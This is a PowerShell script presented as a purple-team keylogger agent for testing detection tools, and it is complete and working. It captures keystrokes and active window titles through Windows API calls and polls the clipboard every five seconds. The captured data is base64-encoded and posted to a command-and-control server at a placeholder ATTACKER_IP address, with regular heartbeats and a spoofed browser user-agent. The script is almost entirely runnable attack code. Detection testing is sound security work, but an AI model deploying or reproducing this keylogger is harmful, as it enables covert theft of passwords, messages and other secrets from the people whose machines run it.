<#
  Purple Team - Windows Keylogger Agent (No Admin Required)
  MITRE: T1056.001 / T1115 / T1041 / T1059.001
  Runs entirely in user context. Paste into any PowerShell session.
  Edit $C2 below to point at your collection server.
#>

$C2    = "http://ATTACKER_IP:8443"
$Token = "purpleteam-xdr-test-2024"
$Id    = "$env:COMPUTERNAME-$env:USERNAME-$(Get-Random -Max 0xFFFF)"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    public static string Win() {
        var s = new StringBuilder(256);
        GetWindowText(GetForegroundWindow(), s, 256);
        return s.ToString();
    }
}
"@

Add-Type -AssemblyName System.Windows.Forms

$buf = [System.Collections.ArrayList]::new()
$lastClip = ""
$exfil = [System.Diagnostics.Stopwatch]::StartNew()
$hb    = [System.Diagnostics.Stopwatch]::StartNew()
$clipT = [System.Diagnostics.Stopwatch]::StartNew()

function Post($ep, $d) {
    try {
        $j = ($d | ConvertTo-Json -Compress)
        Invoke-RestMethod -Uri "$C2$ep" -Method POST -Body $j `
            -ContentType "application/json" `
            -Headers @{"X-Auth-Token"=$Token; "User-Agent"="Mozilla/5.0"} `
            -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Key([int]$vk, [bool]$sh) {
    switch ($vk) {
        8  { "[BS]" }  9  { "[TAB]" }  13 { "[EN]" }  32 { " " }
        46 { "[DEL]" } 27 { "[ESC]" }
        {$_ -ge 48 -and $_ -le 57} {
            $s = @(")", "!", "@", "#", "`$", "%", "^", "&", "*", "(")
            if ($sh) { $s[$vk-48] } else { [char]$vk }
        }
        {$_ -ge 65 -and $_ -le 90} {
            if ($sh) { [char]$vk } else { [char]($vk+32) }
        }
        186 { if($sh){":"}else{";"} }  187 { if($sh){"+"}else{"="} }
        188 { if($sh){"<"}else{","} }  189 { if($sh){"_"}else{"-"} }
        190 { if($sh){">"}else{"."} }  191 { if($sh){"?"}else{"/"} }
        default { $null }
    }
}

# Initial heartbeat
Post "/api/heartbeat" @{
    agent_id=$Id; hostname=$env:COMPUTERNAME; pid=$PID
    platform="Windows"; user="$env:USERDOMAIN\$env:USERNAME"
    admin="false"; method="paste"
}

Write-Host "[*] Agent $Id running (no admin). C2: $C2. Ctrl+C to stop." -ForegroundColor Cyan

while ($true) {
    Start-Sleep -Milliseconds 10

    # Capture keys
    $sh = ([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0
    for ($k = 8; $k -le 191; $k++) {
        if (([K]::GetAsyncKeyState($k) -band 1) -eq 1) {
            $c = Key $k $sh
            if ($c) { [void]$buf.Add($c) }
        }
    }

    # Clipboard every 5s
    if ($clipT.Elapsed.TotalSeconds -ge 5) {
        $clipT.Restart()
        try {
            $cl = [System.Windows.Forms.Clipboard]::GetText()
            if ($cl -and $cl -ne $lastClip) {
                $lastClip = $cl
                $e = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cl))
                Post "/api/clipboard" @{ agent_id=$Id; content=$e; encoding="base64" }
            }
        } catch {}
    }

    # Exfil keystrokes every 15s
    if ($exfil.Elapsed.TotalSeconds -ge 15 -and $buf.Count -gt 0) {
        $keys = $buf -join ""; $buf.Clear(); $exfil.Restart()
        $e = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($keys))
        Post "/api/keystrokes" @{
            agent_id=$Id; keystrokes=$e; encoding="base64"
            window_title=[K]::Win(); count=$keys.Length
        }
    }

    # Heartbeat every 30s
    if ($hb.Elapsed.TotalSeconds -ge 30) {
        Post "/api/heartbeat" @{ agent_id=$Id; hostname=$env:COMPUTERNAME; pid=$PID; platform="Windows"; user=$env:USERNAME }
        $hb.Restart()
    }
}
